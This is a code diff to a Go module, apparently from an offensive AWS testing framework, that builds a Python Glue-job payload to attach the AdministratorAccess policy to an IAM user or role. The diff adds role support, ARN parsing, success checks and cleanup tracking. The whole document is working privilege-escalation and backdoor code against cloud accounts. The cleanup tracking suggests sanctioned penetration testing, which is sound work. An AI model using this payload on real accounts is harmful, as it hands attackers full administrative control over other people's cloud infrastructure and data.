@@ -24,7 +24,7 @@ func (p *BackdoorAttachPolicyPayload) GetName() string {
 }
 
 func (p *BackdoorAttachPolicyPayload) GetDescription() string {
-	return "Attach AdministratorAccess policy to an existing IAM user via Glue job"
+	return "Attach AdministratorAccess policy to an existing IAM user or role via Glue job"
 }
 
 func (p *BackdoorAttachPolicyPayload) GetTags() []string {
@@ -38,8 +38,8 @@ func (p *BackdoorAttachPolicyPayload) GetTags() []string {
 func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
 	return []modules.Option{
 		{
-			Name:        "TARGET_USER",
-			Description: "IAM username to attach the policy to",
+			Name:        "TARGET_ARN",
+			Description: "IAM user or role name/ARN to attach policy to (auto-detects type from ARN, tries both if plain name)",
 			Required:    true,
 		},
 		{
@@ -52,8 +52,8 @@ func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
 }
 
 func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
-	if options["TARGET_USER"] == "" {
-		return fmt.Errorf("TARGET_USER is required for backdoor/attach-policy payload")
+	if options["TARGET_ARN"] == "" {
+		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
 	}
 	return nil
 }
@@ -62,7 +62,7 @@ func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error 
 // Parameters are passed as Glue job arguments (--TARGET_USER, --POLICY_ARN) and
 // read via sys.argv parsing since getResolvedOptions requires the awsglue package.
 func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
-	targetUser := normalizeUserName(options["TARGET_USER"])
+	targetARN := options["TARGET_ARN"]
 	policyArn := options["POLICY_ARN"]
 	if policyArn == "" {
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
@@ -71,32 +71,49 @@ func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (s
 	code := fmt.Sprintf(`import boto3
 import sys
 
-target_user = '%s'
+target = '%s'
 policy_arn = '%s'
 
 # Override from job arguments if provided
 for i, arg in enumerate(sys.argv):
-    if arg == '--TARGET_USER' and i + 1 < len(sys.argv):
-        target_user = sys.argv[i + 1]
+    if arg == '--TARGET_ARN' and i + 1 < len(sys.argv):
+        target = sys.argv[i + 1]
     if arg == '--POLICY_ARN' and i + 1 < len(sys.argv):
         policy_arn = sys.argv[i + 1]
 
-# Handle ARN-style usernames
-if target_user.startswith('arn:') and ':user/' in target_user:
-    target_user = target_user.split(':user/')[-1]
-
 iam = boto3.client('iam')
 
+# Auto-detect principal type from ARN format
+principal_type = None
+principal_name = target
+
+if target.startswith('arn:'):
+    if ':user/' in target:
+        principal_type = 'user'
+        principal_name = target.split(':user/')[-1]
+    elif ':role/' in target:
+        principal_type = 'role'
+        principal_name = target.split(':role/')[-1]
+
 try:
-    iam.attach_user_policy(
-        UserName=target_user,
-        PolicyArn=policy_arn
-    )
-    print(f"Successfully attached {policy_arn} to {target_user}")
+    if principal_type == 'role':
+        iam.attach_role_policy(RoleName=principal_name, PolicyArn=policy_arn)
+    elif principal_type == 'user':
+        iam.attach_user_policy(UserName=principal_name, PolicyArn=policy_arn)
+    else:
+        # Plain name -- try user first, fall back to role
+        try:
+            iam.attach_user_policy(UserName=principal_name, PolicyArn=policy_arn)
+            principal_type = 'user'
+        except iam.exceptions.NoSuchEntityException:
+            iam.attach_role_policy(RoleName=principal_name, PolicyArn=policy_arn)
+            principal_type = 'role'
+
+    print(f"Successfully attached {policy_arn} to {principal_type} {principal_name}")
 except Exception as e:
     print(f"Error attaching policy: {e}")
     raise
-`, targetUser, policyArn)
+`, targetARN, policyArn)
 
 	return code, nil
 }
@@ -107,25 +124,39 @@ func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, erro
 	return result, nil
 }
 
-// VerifySuccess checks whether the target user has the attached policy.
+// VerifySuccess checks whether the target principal has the attached policy.
 func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
-	targetUser := normalizeUserName(options["TARGET_USER"])
+	principalName, principalType := parsePrincipalARN(options["TARGET_ARN"])
 	policyArn := options["POLICY_ARN"]
 	if policyArn == "" {
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
 	}
 
 	iamClient := iam.NewFromConfig(config)
-	result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
-		UserName: aws.String(targetUser),
-	})
-	if err != nil {
-		return false, nil
-	}
 
-	for _, policy := range result.AttachedPolicies {
-		if aws.ToString(policy.PolicyArn) == policyArn {
-			return true, nil
+	if principalType == "role" {
+		result, err := iamClient.ListAttachedRolePolicies(ctx, &iam.ListAttachedRolePoliciesInput{
+			RoleName: aws.String(principalName),
+		})
+		if err != nil {
+			return false, nil
+		}
+		for _, policy := range result.AttachedPolicies {
+			if aws.ToString(policy.PolicyArn) == policyArn {
+				return true, nil
+			}
+		}
+	} else {
+		result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
+			UserName: aws.String(principalName),
+		})
+		if err != nil {
+			return false, nil
+		}
+		for _, policy := range result.AttachedPolicies {
+			if aws.ToString(policy.PolicyArn) == policyArn {
+				return true, nil
+			}
 		}
 	}
 
@@ -134,7 +165,7 @@ func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config 
 
 // ReportSideEffects returns the policy attachment as a tracked modification.
 func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
-	targetUser := normalizeUserName(options["TARGET_USER"])
+	principalName, principalType := parsePrincipalARN(options["TARGET_ARN"])
 	policyArn := options["POLICY_ARN"]
 	if policyArn == "" {
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
@@ -145,27 +176,35 @@ func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]strin
 		policyName = policyArn[idx+1:]
 	}
 
+	cleanupMethod := "iam:DetachUserPolicy"
+	if principalType == "role" {
+		cleanupMethod = "iam:DetachRolePolicy"
+	}
+
 	return []modules.CreatedResource{
 		{
 			Type:          "iam:attached-policy",
-			Name:          fmt.Sprintf("%s←%s", targetUser, policyName),
+			Name:          fmt.Sprintf("%s←%s", principalName, policyName),
 			ARN:           policyArn,
-			CleanupMethod: "iam:DetachUserPolicy",
+			CleanupMethod: cleanupMethod,
 			Metadata: map[string]string{
-				"principal_type": "user",
-				"principal_name": targetUser,
+				"principal_type": principalType,
+				"principal_name": principalName,
 				"policy_arn":     policyArn,
 			},
 		},
 	}
 }
 
-// normalizeUserName extracts the username from an IAM user ARN if provided.
-func normalizeUserName(input string) string {
+// parsePrincipalARN extracts the principal name and type from an ARN or plain name.
+func parsePrincipalARN(input string) (name string, principalType string) {
 	if strings.HasPrefix(input, "arn:") {
+		if idx := strings.Index(input, ":role/"); idx != -1 {
+			return input[idx+len(":role/"):], "role"
+		}
 		if idx := strings.Index(input, ":user/"); idx != -1 {
-			return input[idx+len(":user/"):]
+			return input[idx+len(":user/"):], "user"
 		}
 	}
-	return input
+	return input, "user"
 }
